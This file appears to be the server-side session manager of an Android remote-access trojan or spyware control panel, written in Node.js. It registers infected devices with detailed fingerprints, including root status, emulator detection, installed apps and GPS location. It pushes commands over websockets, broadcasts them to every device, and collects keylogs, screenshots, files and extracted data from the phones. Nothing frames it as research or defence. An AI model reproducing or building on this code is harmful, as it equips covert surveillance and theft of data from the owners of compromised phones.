const crypto = require('crypto');
const EventEmitter = require('events');
const moment = require('moment');
const config = require('./config');
const database = require('./database');

class SessionManager extends EventEmitter {
    constructor() {
        super();
        this.sessions = new Map(); // sessionId -> session object
        this.userSessions = new Map(); // userId -> activeSessionId
        this.pendingCommands = new Map(); // sessionId -> pending commands
        this.websocketConnections = new Map(); // sessionId -> ws
        this.reconnectAttempts = new Map(); // sessionId -> attempt count
        this.sessionHistory = []; // keep track of last 100 sessions
        
        // Session statistics
        this.stats = {
            totalConnections: 0,
            activeConnections: 0,
            failedConnections: 0,
            commandsExecuted: 0,
            dataTransferred: 0
        };
        
        // Start cleanup interval
        this.startCleanupInterval();
    }
    
    // ==================== SESSION MANAGEMENT ====================
    
    createSession(deviceInfo, userId = null) {
        const sessionId = crypto.randomBytes(16).toString('hex');
        const timestamp = Date.now();
        
        const session = {
            id: sessionId,
            userId: userId,
            deviceInfo: {
                id: deviceInfo.device_id || sessionId,
                name: deviceInfo.device_name || 'Unknown Device',
                model: deviceInfo.device_model || 'Unknown',
                brand: deviceInfo.device_brand || 'Unknown',
                androidVersion: deviceInfo.android_version || 'Unknown',
                androidSdk: deviceInfo.android_sdk || 0,
                ip: deviceInfo.ip_address || '0.0.0.0',
                mac: deviceInfo.mac_address || '00:00:00:00:00:00',
                country: deviceInfo.country || 'Unknown',
                city: deviceInfo.city || 'Unknown',
                latitude: deviceInfo.latitude || 0,
                longitude: deviceInfo.longitude || 0,
                battery: deviceInfo.battery || 0,
                batteryStatus: deviceInfo.battery_status || 'Unknown',
                storageTotal: deviceInfo.storage_total || 0,
                storageFree: deviceInfo.storage_free || 0,
                ramTotal: deviceInfo.ram_total || 0,
                ramFree: deviceInfo.ram_free || 0,
                cpuCores: deviceInfo.cpu_cores || 0,
                isRooted: deviceInfo.is_rooted || false,
                isEmulator: deviceInfo.is_emulator || false,
                installedApps: deviceInfo.installed_apps || 0,
                carrier: deviceInfo.carrier || 'Unknown',
                networkType: deviceInfo.network_type || 'Unknown',
                screenWidth: deviceInfo.screen_width || 0,
                screenHeight: deviceInfo.screen_height || 0,
                timezone: deviceInfo.timezone || 'UTC',
                language: deviceInfo.language || 'en'
            },
            status: 'active', // active, idle, disconnected, killed
            connected: true,
            firstSeen: timestamp,
            lastSeen: timestamp,
            lastHeartbeat: timestamp,
            lastCommand: null,
            lastCommandTime: null,
            commandsExecuted: 0,
            dataReceived: 0,
            dataSent: 0,
            metadata: deviceInfo.metadata || {},
            tags: [],
            notes: '',
            connectionType: deviceInfo.connection_type || 'direct',
            proxyInfo: deviceInfo.proxy_info || null
        };
        
        this.sessions.set(sessionId, session);
        this.sessionHistory.unshift({
            sessionId: sessionId,
            deviceName: session.deviceInfo.name,
            connectedAt: timestamp,
            disconnectedAt: null
        });
        
        // Trim history
        if (this.sessionHistory.length > 100) {
            this.sessionHistory.pop();
        }
        
        this.stats.totalConnections++;
        this.stats.activeConnections++;
        
        // Save to database
        database.addSession(sessionId, session.deviceInfo).catch(console.error);
        
        // Emit event
        this.emit('session_created', session);
        
        console.log(`🔌 New session created: ${sessionId} - ${session.deviceInfo.name} (${session.deviceInfo.ip})`);
        
        return session;
    }
    
    getSession(sessionId) {
        return this.sessions.get(sessionId);
    }
    
    getSessionByUserId(userId) {
        const sessionId = this.userSessions.get(userId);
        return sessionId ? this.sessions.get(sessionId) : null;
    }
    
    getAllSessions() {
        return Array.from(this.sessions.values());
    }
    
    getActiveSessions() {
        return Array.from(this.sessions.values()).filter(s => s.status === 'active' && s.connected);
    }
    
    getSessionsByStatus(status) {
        return Array.from(this.sessions.values()).filter(s => s.status === status);
    }
    
    getSessionCount() {
        return {
            total: this.sessions.size,
            active: this.getActiveSessions().length,
            idle: this.getSessionsByStatus('idle').length,
            disconnected: this.getSessionsByStatus('disconnected').length,
            killed: this.getSessionsByStatus('killed').length
        };
    }
    
    // ==================== SESSION UPDATES ====================
    
    updateSession(sessionId, updates) {
        const session = this.sessions.get(sessionId);
        if (!session) return false;
        
        Object.assign(session, updates);
        session.lastSeen = Date.now();
        
        if (updates.deviceInfo) {
            Object.assign(session.deviceInfo, updates.deviceInfo);
        }
        
        // Update database
        database.updateSession(sessionId, session).catch(console.error);
        
        this.emit('session_updated', session);
        
        return true;
    }
    
    updateSessionLocation(sessionId, latitude, longitude, altitude, accuracy) {
        const session = this.sessions.get(sessionId);
        if (!session) return false;
        
        session.deviceInfo.latitude = latitude;
        session.deviceInfo.longitude = longitude;
        session.deviceInfo.altitude = altitude;
        session.deviceInfo.accuracy = accuracy;
        session.lastSeen = Date.now();
        
        this.emit('session_location_updated', session, { latitude, longitude, altitude, accuracy });
        
        return true;
    }
    
    updateSessionBattery(sessionId, level, status, temperature) {
        const session = this.sessions.get(sessionId);
        if (!session) return false;
        
        session.deviceInfo.battery = level;
        session.deviceInfo.batteryStatus = status;
        session.deviceInfo.batteryTemperature = temperature;
        session.lastSeen = Date.now();
        
        // Alert if battery is critically low
        if (level <= 15) {
            this.emit('battery_critical', session, level);
        }
        
        return true;
    }
    
    updateHeartbeat(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return false;
        
        session.lastHeartbeat = Date.now();
        session.lastSeen = Date.now();
        
        if (session.status !== 'active') {
            session.status = 'active';
            session.connected = true;
            this.stats.activeConnections++;
            this.emit('session_reconnected', session);
        }
        
        return true;
    }
    
    // ==================== SESSION CONTROL ====================
    
    selectSession(userId, sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return false;
        
        this.userSessions.set(userId, sessionId);
        this.emit('session_selected', { userId, sessionId, session });
        
        return true;
    }
    
    deselectSession(userId) {
        const sessionId = this.userSessions.get(userId);
        if (sessionId) {
            this.userSessions.delete(userId);
            this.emit('session_deselected', { userId, sessionId });
            return true;
        }
        return false;
    }
    
    getSelectedSession(userId) {
        const sessionId = this.userSessions.get(userId);
        return sessionId ? this.sessions.get(sessionId) : null;
    }
    
    killSession(sessionId, reason = 'user_terminated') {
        const session = this.sessions.get(sessionId);
        if (!session) return false;
        
        session.status = 'killed';
        session.connected = false;
        session.disconnectedAt = Date.now();
        session.killReason = reason;
        
        this.stats.activeConnections--;
        
        // Close websocket if exists
        const ws = this.websocketConnections.get(sessionId);
        if (ws && ws.readyState === 1) {
            ws.close();
        }
        this.websocketConnections.delete(sessionId);
        
        // Cancel pending commands
        if (this.pendingCommands.has(sessionId)) {
            const pending = this.pendingCommands.get(sessionId);
            for (const cmd of pending) {
                cmd.cancel();
            }
            this.pendingCommands.delete(sessionId);
        }
        
        // Update database
        database.killSession(sessionId).catch(console.error);
        
        this.emit('session_killed', session, reason);
        
        console.log(`💀 Session killed: ${sessionId} - Reason: ${reason}`);
        
        return true;
    }
    
    disconnectSession(sessionId, reason = 'network_error') {
        const session = this.sessions.get(sessionId);
        if (!session) return false;
        
        session.status = 'disconnected';
        session.connected = false;
        session.disconnectedAt = Date.now();
        session.disconnectReason = reason;
        
        this.stats.activeConnections--;
        
        // Track reconnect attempts
        const attempts = this.reconnectAttempts.get(sessionId) || 0;
        this.reconnectAttempts.set(sessionId, attempts + 1);
        
        this.emit('session_disconnected', session, reason);
        
        console.log(`🔌 Session disconnected: ${sessionId} - Reason: ${reason}`);
        
        return true;
    }
    
    reconnectSession(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return false;
        
        if (session.status === 'disconnected') {
            session.status = 'active';
            session.connected = true;
            session.lastSeen = Date.now();
            session.disconnectedAt = null;
            
            this.stats.activeConnections++;
            this.reconnectAttempts.delete(sessionId);
            
            this.emit('session_reconnected', session);
            
            console.log(`🔄 Session reconnected: ${sessionId}`);
            return true;
        }
        
        return false;
    }
    
    // ==================== COMMAND MANAGEMENT ====================
    
    async executeCommand(sessionId, command, params = {}, timeout = 30000) {
        const session = this.sessions.get(sessionId);
        if (!session) {
            throw new Error('Session not found');
        }
        
        if (!session.connected) {
            throw new Error('Session not connected');
        }
        
        const commandId = crypto.randomBytes(8).toString('hex');
        const timestamp = Date.now();
        
        const commandObj = {
            id: commandId,
            sessionId: sessionId,
            command: command,
            params: params,
            timestamp: timestamp,
            status: 'pending',
            result: null,
            error: null,
            startTime: timestamp,
            endTime: null,
            timeout: timeout
        };
        
        // Store pending command
        if (!this.pendingCommands.has(sessionId)) {
            this.pendingCommands.set(sessionId, []);
        }
        this.pendingCommands.get(sessionId).push(commandObj);
        
        // Send command via websocket
        const ws = this.websocketConnections.get(sessionId);
        if (ws && ws.readyState === 1) {
            ws.send(JSON.stringify({
                type: 'command',
                id: commandId,
                action: command,
                params: params,
                timestamp: timestamp
            }));
        } else {
            commandObj.status = 'failed';
            commandObj.error = 'No websocket connection';
            this.stats.failedConnections++;
            throw new Error('No websocket connection');
        }
        
        // Save to database
        await database.addCommand(sessionId, command, command, params).catch(console.error);
        
        this.stats.commandsExecuted++;
        session.commandsExecuted++;
        session.lastCommand = command;
        session.lastCommandTime = timestamp;
        
        // Set timeout
        const timeoutId = setTimeout(() => {
            const pending = this.pendingCommands.get(sessionId);
            const cmdIndex = pending.findIndex(c => c.id === commandId);
            if (cmdIndex !== -1 && pending[cmdIndex].status === 'pending') {
                pending[cmdIndex].status = 'timeout';
                pending[cmdIndex].error = 'Command timeout';
                this.emit('command_timeout', commandId, sessionId, command);
            }
        }, timeout);
        
        commandObj.timeoutId = timeoutId;
        
        // Return promise for result
        return new Promise((resolve, reject) => {
            const checkResult = (resultCommandId, result) => {
                if (resultCommandId === commandId) {
                    clearTimeout(timeoutId);
                    const pending = this.pendingCommands.get(sessionId);
                    const cmdIndex = pending.findIndex(c => c.id === commandId);
                    if (cmdIndex !== -1) {
                        const cmd = pending[cmdIndex];
                        cmd.status = 'completed';
                        cmd.result = result;
                        cmd.endTime = Date.now();
                        pending.splice(cmdIndex, 1);
                        resolve(result);
                    }
                }
            };
            
            this.once(`command_result_${commandId}`, checkResult);
            
            // Handle timeout
            setTimeout(() => {
                this.removeListener(`command_result_${commandId}`, checkResult);
                if (commandObj.status !== 'completed') {
                    reject(new Error('Command timeout'));
                }
            }, timeout + 1000);
        });
    }
    
    handleCommandResult(commandId, sessionId, result, error = null) {
        const pending = this.pendingCommands.get(sessionId);
        if (!pending) return;
        
        const cmd = pending.find(c => c.id === commandId);
        if (cmd) {
            cmd.status = error ? 'failed' : 'completed';
            cmd.result = result;
            cmd.error = error;
            cmd.endTime = Date.now();
            
            if (cmd.timeoutId) {
                clearTimeout(cmd.timeoutId);
            }
            
            const index = pending.indexOf(cmd);
            pending.splice(index, 1);
            
            this.emit(`command_result_${commandId}`, result);
            this.emit('command_completed', cmd);
        }
    }
    
    getPendingCommands(sessionId) {
        return this.pendingCommands.get(sessionId) || [];
    }
    
    cancelPendingCommands(sessionId) {
        const pending = this.pendingCommands.get(sessionId);
        if (pending) {
            for (const cmd of pending) {
                if (cmd.timeoutId) {
                    clearTimeout(cmd.timeoutId);
                }
            }
            this.pendingCommands.delete(sessionId);
            return true;
        }
        return false;
    }
    
    // ==================== WEBSOCKET MANAGEMENT ====================
    
    registerWebSocket(sessionId, ws) {
        this.websocketConnections.set(sessionId, ws);
        
        ws.on('message', async (data) => {
            try {
                const message = JSON.parse(data);
                await this.handleWebSocketMessage(sessionId, message);
            } catch (error) {
                console.error('WebSocket message error:', error);
            }
        });
        
        ws.on('close', () => {
            this.websocketConnections.delete(sessionId);
            this.disconnectSession(sessionId, 'websocket_closed');
        });
        
        ws.on('error', (error) => {
            console.error(`WebSocket error for session ${sessionId}:`, error);
            this.disconnectSession(sessionId, 'websocket_error');
        });
        
        // Update session
        const session = this.sessions.get(sessionId);
        if (session && session.status === 'disconnected') {
            this.reconnectSession(sessionId);
        }
    }
    
    async handleWebSocketMessage(sessionId, message) {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        
        switch (message.type) {
            case 'connect':
                // Update device info
                if (message.data) {
                    this.updateSession(sessionId, {
                        deviceInfo: {
                            ...session.deviceInfo,
                            ...message.data
                        }
                    });
                }
                break;
                
            case 'heartbeat':
                this.updateHeartbeat(sessionId);
                break;
                
            case 'command_result':
                this.handleCommandResult(message.id, sessionId, message.result, message.error);
                break;
                
            case 'location':
                if (message.data) {
                    this.updateSessionLocation(
                        sessionId,
                        message.data.latitude,
                        message.data.longitude,
                        message.data.altitude,
                        message.data.accuracy
                    );
                }
                break;
                
            case 'battery':
                if (message.data) {
                    this.updateSessionBattery(
                        sessionId,
                        message.data.level,
                        message.data.status,
                        message.data.temperature
                    );
                }
                break;
                
            case 'data':
                // Handle data extraction response
                this.emit('data_received', sessionId, message.data);
                break;
                
            case 'keylog':
                this.emit('keylog_received', sessionId, message.data);
                break;
                
            case 'screenshot':
                this.emit('screenshot_received', sessionId, message.data);
                break;
                
            case 'file':
                this.emit('file_received', sessionId, message.data);
                break;
                
            case 'error':
                console.error(`Session ${sessionId} error:`, message.error);
                this.emit('session_error', sessionId, message.error);
                break;
                
            default:
                console.log(`Unknown message type from ${sessionId}:`, message.type);
        }
        
        // Update data transfer stats
        session.dataReceived += JSON.stringify(message).length;
        this.stats.dataTransferred += JSON.stringify(message).length;
    }
    
    sendToSession(sessionId, data) {
        const ws = this.websocketConnections.get(sessionId);
        if (ws && ws.readyState === 1) {
            ws.send(JSON.stringify(data));
            const session = this.sessions.get(sessionId);
            if (session) {
                session.dataSent += JSON.stringify(data).length;
                this.stats.dataTransferred += JSON.stringify(data).length;
            }
            return true;
        }
        return false;
    }
    
    broadcastToAll(data, filterFn = null) {
        let count = 0;
        for (const [sessionId, ws] of this.websocketConnections) {
            if (filterFn && !filterFn(sessionId)) continue;
            if (ws.readyState === 1) {
                ws.send(JSON.stringify(data));
                count++;
            }
        }
        return count;
    }
    
    // ==================== SESSION TAGGING ====================
    
    addTag(sessionId, tag) {
        const session = this.sessions.get(sessionId);
        if (!session) return false;
        
        if (!session.tags.includes(tag)) {
            session.tags.push(tag);
            this.emit('session_tag_added', sessionId, tag);
            return true;
        }
        return false;
    }
    
    removeTag(sessionId, tag) {
        const session = this.sessions.get(sessionId);
        if (!session) return false;
        
        const index = session.tags.indexOf(tag);
        if (index !== -1) {
            session.tags.splice(index, 1);
            this.emit('session_tag_removed', sessionId, tag);
            return true;
        }
        return false;
    }
    
    getSessionsByTag(tag) {
        return Array.from(this.sessions.values()).filter(s => s.tags.includes(tag));
    }
    
    // ==================== SESSION NOTES ====================
    
    setNotes(sessionId, notes) {
        const session = this.sessions.get(sessionId);
        if (!session) return false;
        
        session.notes = notes;
        this.emit('session_notes_updated', sessionId, notes);
        return true;
    }
    
    getNotes(sessionId) {
        const session = this.sessions.get(sessionId);
        return session ? session.notes : null;
    }
    
    // ==================== SESSION HISTORY ====================
    
    getSessionHistory(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        
        return {
            sessionId: sessionId,
            deviceName: session.deviceInfo.name,
            firstSeen: session.firstSeen,
            lastSeen: session.lastSeen,
            lastHeartbeat: session.lastHeartbeat,
            lastCommand: session.lastCommand,
            lastCommandTime: session.lastCommandTime,
            commandsExecuted: session.commandsExecuted,
            totalUptime: session.lastSeen - session.firstSeen,
            connectionHistory: this.sessionHistory.filter(h => h.sessionId === sessionId)
        };
    }
    
    getRecentSessions(limit = 20) {
        return this.sessionHistory.slice(0, limit);
    }
    
    // ==================== STATISTICS ====================
    
    getStats() {
        const sessionStats = this.getSessionCount();
        
        return {
            ...this.stats,
            ...sessionStats,
            avgCommandsPerSession: this.stats.commandsExecuted / (this.sessions.size || 1),
            avgDataPerSession: (this.stats.dataTransferred / (this.sessions.size || 1)).toFixed(2),
            uptime: process.uptime(),
            timestamp: Date.now()
        };
    }
    
    resetStats() {
        this.stats = {
            totalConnections: 0,
            activeConnections: 0,
            failedConnections: 0,
            commandsExecuted: 0,
            dataTransferred: 0
        };
        this.emit('stats_reset');
    }
    
    // ==================== CLEANUP ====================
    
    startCleanupInterval() {
        // Clean up stale sessions every 5 minutes
        setInterval(() => {
            this.cleanupStaleSessions();
        }, 5 * 60 * 1000);
        
        // Clean up old pending commands every minute
        setInterval(() => {
            this.cleanupPendingCommands();
        }, 60 * 1000);
    }
    
    cleanupStaleSessions() {
        const now = Date.now();
        const staleThreshold = 5 * 60 * 1000; // 5 minutes
        const deadThreshold = 30 * 60 * 1000; // 30 minutes
        
        for (const [sessionId, session] of this.sessions) {
            // Mark as idle if no heartbeat for 5 minutes
            if (session.connected && (now - session.lastHeartbeat) > staleThreshold) {
                session.status = 'idle';
                session.connected = false;
                this.stats.activeConnections--;
                this.emit('session_idle', session);
                console.log(`😴 Session idle: ${sessionId}`);
            }
            
            // Kill if dead for 30 minutes
            if (session.status === 'idle' && (now - session.lastHeartbeat) > deadThreshold) {
                this.killSession(sessionId, 'stale_timeout');
                console.log(`💀 Session killed (stale): ${sessionId}`);
            }
        }
    }
    
    cleanupPendingCommands() {
        const staleThreshold = 5 * 60 * 1000; // 5 minutes
        
        for (const [sessionId, commands] of this.pendingCommands) {
            const filtered = commands.filter(cmd => {
                if ((Date.now() - cmd.timestamp) > staleThreshold) {
                    cmd.status = 'stale';
                    this.emit('command_stale', cmd);
                    return false;
                }
                return true;
            });
            
            if (filtered.length === 0) {
                this.pendingCommands.delete(sessionId);
            } else {
                this.pendingCommands.set(sessionId, filtered);
            }
        }
    }
    
    // ==================== EXPORT/IMPORT ====================
    
    exportSessions() {
        return {
            sessions: Array.from(this.sessions.entries()),
            stats: this.stats,
            exportedAt: Date.now(),
            version: '12.0.0'
        };
    }
    
    importSessions(data) {
        if (data.version !== '12.0.0') {
            throw new Error('Incompatible session data version');
        }
        
        for (const [sessionId, session] of data.sessions) {
            this.sessions.set(sessionId, session);
        }
        
        this.stats = data.stats;
        this.emit('sessions_imported', data.sessions.length);
        
        return data.sessions.length;
    }
    
    // ==================== UTILITIES ====================
    
    formatSessionForDisplay(session) {
        const lastSeen = moment(session.lastSeen).fromNow();
        const uptime = moment.duration(Date.now() - session.firstSeen).humanize();
        
        return {
            id: session.id,
            device: `${session.deviceInfo.brand} ${session.deviceInfo.name}`,
            model: session.deviceInfo.model,
            android: session.deviceInfo.androidVersion,
            ip: session.deviceInfo.ip,
            location: session.deviceInfo.latitude && session.deviceInfo.longitude 
                ? `${session.deviceInfo.latitude}, ${session.deviceInfo.longitude}`
                : 'Unknown',
            battery: `${session.deviceInfo.battery}% (${session.deviceInfo.batteryStatus})`,
            status: session.status,
            connected: session.connected ? '✅' : '❌',
            lastSeen: lastSeen,
            uptime: uptime,
            commands: session.commandsExecuted,
            tags: session.tags.join(', ') || 'None',
            notes: session.notes || ''
        };
    }
    
    formatAllSessionsForDisplay() {
        return this.getAllSessions().map(s => this.formatSessionForDisplay(s));
    }
    
    // ==================== EVENTS ====================
    
    onSessionCreated(callback) {
        this.on('session_created', callback);
    }
    
    onSessionUpdated(callback) {
        this.on('session_updated', callback);
    }
    
    onSessionKilled(callback) {
        this.on('session_killed', callback);
    }
    
    onSessionDisconnected(callback) {
        this.on('session_disconnected', callback);
    }
    
    onSessionReconnected(callback) {
        this.on('session_reconnected', callback);
    }
    
    onCommandCompleted(callback) {
        this.on('command_completed', callback);
    }
    
    onDataReceived(callback) {
        this.on('data_received', callback);
    }
    
    onKeylogReceived(callback) {
        this.on('keylog_received', callback);
    }
    
    onScreenshotReceived(callback) {
        this.on('screenshot_received', callback);
    }
    
    onFileReceived(callback) {
        this.on('file_received', callback);
    }
}

module.exports = new SessionManager();
